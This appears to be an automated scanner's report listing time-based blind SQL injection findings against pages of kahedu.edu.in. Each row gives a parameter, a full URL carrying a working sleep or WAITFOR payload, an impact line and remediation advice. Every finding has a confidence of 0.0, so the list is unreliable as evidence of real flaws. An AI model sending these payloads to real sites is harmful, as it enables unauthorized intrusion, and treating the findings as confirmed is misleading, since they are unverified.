Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
